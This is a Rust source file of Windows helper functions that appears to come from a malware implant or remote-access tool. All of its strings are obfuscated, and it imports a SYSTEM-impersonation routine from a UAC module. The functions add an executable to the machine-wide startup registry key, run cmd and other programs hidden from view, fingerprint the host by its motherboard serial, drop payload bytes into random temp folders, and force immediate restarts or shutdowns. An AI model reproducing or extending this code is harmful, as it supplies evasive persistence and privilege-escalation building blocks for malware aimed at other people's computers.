use std::{
    env,
    os::windows::process::CommandExt,
    path::PathBuf,
    process::{ Command, Output },
    time::Duration,
};
use anyhow::{ Context, Result };
use obfstr::obfstr as s;
use rand::{ distributions::Alphanumeric, Rng };
use winreg::{ enums::HKEY_LOCAL_MACHINE, RegKey };
use crate::uac::impersonate_system::execute_file_as_system;

pub fn get_current_exe() -> PathBuf {
    env::current_exe().unwrap()
}
pub fn get_current_exe_dir() -> PathBuf {
    get_current_exe().parent().unwrap().to_path_buf()
}
pub fn system32_dir() -> PathBuf {
    PathBuf::from(env::var(s!("SystemRoot")).unwrap_or(s!(r"C:\Windows").to_string())).join(
        s!("System32")
    )
}
pub fn programdata_dir() -> PathBuf {
    PathBuf::from(env::var(s!("PROGRAMDATA")).unwrap_or(s!("%PROGRAMDATA%").to_owned()))
}
pub fn env_to_pathbuf(env_var: &str) -> PathBuf {
    PathBuf::from(env::var(env_var).unwrap_or(env_var.to_owned()))
}
pub fn current_appdata_dir() -> PathBuf {
    PathBuf::from(env::var(s!("APPDATA")).unwrap_or(s!("%APPDATA%").to_owned()))
}

pub fn add_to_startup_global(name: &str, exe_location: String) -> Result<()> {
    let (key, _) = RegKey::predef(HKEY_LOCAL_MACHINE)
        .create_subkey(s!(r"Software\Microsoft\Windows\CurrentVersion\Run"))
        .context(s!("failed to create subkey in registry").to_string())?;

    key.set_value(name, &exe_location).context(s!("failed to set value in registry").to_string())?;
    Ok(())
}
pub fn generate_random_string(length: usize) -> String {
    let random_string = (0..length)
        .map(|_| rand::thread_rng().sample(Alphanumeric) as char)
        .collect();

    random_string
}

pub fn spawn_cmd(command: &str) -> Result<()> {
    Command::new(s!("cmd"))
        .arg(s!("/C"))
        .raw_arg(format!(" {}", &command))
        .creation_flags(0x08000000) // CREATE_NO_WINDOW flag
        .spawn()
        .context(s!("Failed to spawn cmd").to_string())?;

    Ok(())
}

pub fn spawn_program(program: &str, args: Option<&str>) -> Result<()> {
    let mut cmd = Command::new(program);
    if let Some(cmd_str) = args {
        cmd.raw_arg(format!(" {}", cmd_str));
    }

    cmd
        .creation_flags(0x08000000) // CREATE_NO_WINDOW flag
        .spawn()
        .context(s!("Failed to spawn hidden program").to_string())?;

    Ok(())
}
pub fn call_cmd(command: &str) -> Result<Output> {
    let output = Command::new(s!("cmd"))
        .arg(s!("/C"))
        .raw_arg(format!(" {}", &command))
        .creation_flags(0x08000000) // CREATE_NO_WINDOW flag
        .output()
        .context(s!("Failed to get output from cmd").to_string())?;
    Ok(output)
}
pub fn call_program(program: &str, args: Option<&str>) -> Result<Output> {
    let mut cmd = Command::new(program);
    if let Some(cmd_str) = args {
        cmd.raw_arg(format!(" {}", cmd_str));
    }

    let output = cmd
        .creation_flags(0x08000000) // CREATE_NO_WINDOW flag
        .output()
        .context(s!("Failed to get output from call hidden program").to_string())?;

    Ok(output)
}

pub fn try_spawn_program_as_system(program: &str, args: Option<&str>) -> Result<()> {
    match execute_file_as_system(&program, args.clone(), false) {
        Ok(()) => {
            return Ok(());
        }
        Err(_error) => {
            spawn_program(program, args)?;
        }
    }
    Ok(())
}

pub fn get_motherboard_serial_number() -> Result<String> {
    let output = call_program(s!("wmic"), Some(s!("baseboard get serialnumber")))?;

    let output_str = String::from_utf8_lossy(&output.stdout);
    let lines: Vec<&str> = output_str.split('\n').collect();
    let serial_number = lines[1].trim();

    Ok(serial_number.to_owned())
}

pub fn is_running_from_system32() -> bool {
    if get_current_exe_dir().starts_with(system32_dir()) { true } else { false }
}
pub fn exit_1() -> ! {
    let sleep_duration = Duration::from_secs(rand::thread_rng().gen_range(2.1..3.4) as u64);
    std::thread::sleep(sleep_duration);
    std::process::exit(1);
}
pub fn exit_1_insta() -> ! {
    std::process::exit(1);
}
pub fn restart_pc_instant() -> Result<()> {
    spawn_program(s!("shutdown"), Some(s!(r#"/r /f /t 0"#)))
}
pub fn shutdown_pc_instant() -> Result<()> {
    spawn_program(s!("shutdown"), Some(s!(r#"/s /f /t 0"#)))
}
pub fn create_random_folder_in_temp() -> Result<PathBuf> {
    let temp_dir = env::temp_dir();
    let mut rng = rand::thread_rng();
    let random_string: String = rng.gen::<u64>().to_string().chars().take(8).collect();
    let folder_path = temp_dir.join(random_string);
    std::fs::create_dir(&folder_path)?;
    Ok(folder_path)
}

pub fn write_file_to_random_folder(file_name: &str, bytes: &[u8]) -> Result<PathBuf> {
    let folder_path = create_random_folder_in_temp()?;
    let file_path = folder_path.join(file_name);
    std::fs::write(&file_path, bytes)?;
    Ok(file_path)
}
pub fn write_bytes_to_file(file_path: PathBuf, bytes: &[u8]) -> Result<()> {
    std::fs::write(file_path, bytes)?;
    Ok(())
}
